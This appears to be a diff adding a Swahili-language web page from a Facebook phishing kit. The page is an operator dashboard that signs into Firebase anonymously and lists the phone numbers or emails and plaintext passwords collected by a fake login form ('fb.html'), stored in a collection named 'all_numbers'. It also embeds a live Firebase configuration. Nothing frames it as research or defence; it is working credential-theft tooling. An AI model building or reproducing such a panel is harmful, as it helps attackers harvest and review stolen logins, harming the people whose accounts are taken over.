@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Taarifa Zote Zilizotumwa</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #f0f2f5; color: #1c1e21; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .container { width: 100%; max-width: 800px; background: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; margin-top: 20px; }
+        .header { background-color: #1877f2; color: white; padding: 20px; text-align: center; position: relative; }
+        .header h1 { font-size: 22px; font-weight: 600; }
+        .header p { font-size: 14px; margin-top: 5px; opacity: 0.9; }
+        .back-btn { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); background: rgba(255,255,255,0.2); border: none; color: white; font-size: 20px; width: 36px; height: 36px; border-radius: 50%; cursor: pointer; display: flex; justify-content: center; align-items: center; text-decoration: none; transition: background 0.2s; }
+        .back-btn:hover { background: rgba(255,255,255,0.4); }
+        .table-wrapper { overflow-x: auto; padding: 0; }
+        table { width: 100%; border-collapse: collapse; min-width: 600px; }
+        th, td { padding: 15px 20px; text-align: left; border-bottom: 1px solid #e4e6eb; }
+        th { background-color: #f5f6f7; font-weight: 600; color: #606770; font-size: 14px; text-transform: uppercase; }
+        td { font-size: 15px; color: #1c1e21; }
+        tr:hover { background-color: #f7f9fa; }
+        .password-cell { font-family: monospace; background: #fff3cd; color: #856404; padding: 4px 8px; border-radius: 4px; display: inline-block; font-weight: bold; }
+        .date-cell { font-size: 13px; color: #606770; }
+        .loading, .empty-state, .error-state { text-align: center; padding: 40px 20px; color: #606770; font-size: 16px; }
+        .error-state { color: #dc3545; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .refresh-btn { background-color: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: opacity 0.2s; }
+        .refresh-btn:hover { opacity: 0.8; }
+        @media (max-width: 600px) { th, td { padding: 12px 10px; font-size: 13px; } .header h1 { font-size: 18px; } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <a href="fb.html" class="back-btn" title="Rudi kwenye fomu">&larr;</a>
+            <h1>Taarifa Zote Zilizopokelewa</h1>
+            <p>Data zinazotoka kwenye fomu ya kuingia</p>
+        </div>
+
+        <div class="table-wrapper">
+            <div id="statusMessage" class="loading">
+                <div class="spinner"></div>
+                Inapakia taarifa...
+            </div>
+            <table id="dataTable" style="display: none;">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Namba ya Simu / Barua Pepe</th>
+                        <th>Neno la Siri (Password)</th>
+                        <th>Muda</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+        import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBPkx-WMYTTongmbYGUy2w86wxF3QprNkQ",
+            authDomain: "sadebooks-ce48b.firebaseapp.com",
+            projectId: "sadebooks-ce48b",
+            storageBucket: "sadebooks-ce48b.firebasestorage.app",
+            messagingSenderId: "746477327",
+            appId: "1:746477327:web:6351c78b68827a0525507a",
+            measurementId: "G-234Z9S8C67"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        const statusMessage = document.getElementById('statusMessage');
+        const dataTable = document.getElementById('dataTable');
+        const tableBody = document.getElementById('tableBody');
+
+        function showError(message) {
+            statusMessage.innerHTML = `<div class="error-state">${message}</div>`;
+            statusMessage.style.display = 'block';
+            dataTable.style.display = 'none';
+        }
+
+        function showEmpty() {
+            statusMessage.innerHTML = `
+                <div class="empty-state">
+                    <p>Hakuna taarifa zilizotumwa bado.</p>
+                    <button class="refresh-btn" onclick="window.location.reload()">Sasisha (Refresh)</button>
+                </div>`;
+            statusMessage.style.display = 'block';
+            dataTable.style.display = 'none';
+        }
+
+        function renderData(snapshot) {
+            tableBody.innerHTML = ''; 
+            if (snapshot.empty) {
+                showEmpty();
+                return;
+            }
+
+            let count = 1;
+            snapshot.forEach((doc) => {
+                const data = doc.data();
+                
+                // 1. Tafuta Namba/Email
+                let displayPhone = data.phone || data.num || data.email || data.phoneNumber || data.username || data.uid || 'N/A';
+                
+                // 2. Tafuta Neno la Siri
+                let displayPassword = data.password || data.pass || data.pwd || data.nenoLaSiri || 'N/A';
+
+                // 3. Tafuta Tarehe
+                let dateStr = 'Haijulikani';
+                if (data.timestamp) {
+                    if (data.timestamp.toDate) {
+                         dateStr = data.timestamp.toDate().toLocaleString('sw-TZ');
+                    } else {
+                         dateStr = data.timestamp; 
+                    }
+                } else if (data.updatedAt) {
+                    dateStr = data.updatedAt.toDate ? data.updatedAt.toDate().toLocaleString('sw-TZ') : data.updatedAt;
+                } else if (data.time) {
+                    dateStr = new Date(data.time).toLocaleString('sw-TZ');
+                }
+
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${count}</td>
+                    <td>${displayPhone}</td>
+                    <td><span class="password-cell">${displayPassword}</span></td>
+                    <td class="date-cell">${dateStr}</td>
+                `;
+                tableBody.appendChild(tr);
+                count++;
+            });
+
+            statusMessage.style.display = 'none';
+            dataTable.style.display = 'table';
+        }
+
+        async function fetchData() {
+            try {
+                if (!auth.currentUser) {
+                    await signInAnonymously(auth);
+                }
+                
+                // Subiri kidogo ili Auth isambazwe
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                // Tumeondoa orderBy ili data zote zionekane bila kujali zina timestamp au lah
+                const snapshot = await getDocs(collection(db, "all_numbers"));
+                
+                renderData(snapshot);
+
+            } catch (error) {
+                console.error("Kosa la kusoma data: ", error);
+                let errorMsg = "Imeshindikana kupata taarifa. ";
+                if (error.code === 'auth/admin-restricted-operation') {
+                    errorMsg += "Anonymous Auth haijawashwa kwenye Firebase Console.";
+                } else if (error.code === 'permission-denied') {
+                    errorMsg += "Firestore Rules zinakataa. Hakikisha umeingia.";
+                } else {
+                    errorMsg += "Angalia console (F12) kwa maelezo zaidi.";
+                }
+                showError(errorMsg);
+            }
+        }
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                fetchData();
+            } else {
+                signInAnonymously(auth).then(() => {
+                    fetchData();
+                }).catch((error) => {
+                    console.error("Imeshindikana kuingia: ", error);
+                    showError("Imeshindikana kuunganisha na Firebase. Hakikisha Anonymous Auth imewashwa.");
+                });
+            }
+        });
+    </script>
+</body>
+</html>
